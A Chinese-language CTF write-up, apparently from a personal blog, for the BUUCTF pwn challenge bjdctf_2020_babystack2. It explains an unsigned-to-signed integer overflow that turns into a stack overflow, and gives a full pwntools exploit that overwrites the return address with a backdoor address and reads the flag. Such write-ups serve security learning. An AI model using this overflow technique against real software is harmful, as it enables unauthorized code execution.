---
title: "BUUCTF Pwn Bjdctf_2020_babystack2"
date: 2020-05-05T23:30:10+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Bjdctf_2020_babystack2

考点：

1、无符号整形溢出

2、64位栈溢出

3、ret2libc1

![image-20200505233702259](D:\Github\myblog\static\images\image-20200505233702259.png)

nbytes是size_t类型相当于unsigned int，在if判断中又强制转换为有符号整形，所以存在整形溢出，输入"-1\"就可以绕过if判断，并且使read函数可以读入的数据非常大造成栈溢出

![image-20200505234220516](D:\Github\myblog\static\images\image-20200505234220516.png)

本题存在后门，接下来就是常规的ret2libc1

```python
#!/usr/bin/python2
#-*- coding=UTF-8 -*-
from pwn import *

context.log_level = 'debug'

if args.R:
	sh = remote('node3.buuoj.cn',29284)
else:
	sh = process('./bjdctf_2020_babystack2')

fakerbp = 0x8
offset = 0x10 + fakerbp
system_addr = 0x400726

sh.sendlineafter('name:\n','-1')
payload = 'a'*offset + p64(system_addr)
sh.sendlineafter('name?\n',payload)
sh.sendline('cat flag')
sh.interactive()
```

![image-20200505234442937](D:\Github\myblog\static\images\image-20200505234442937.png)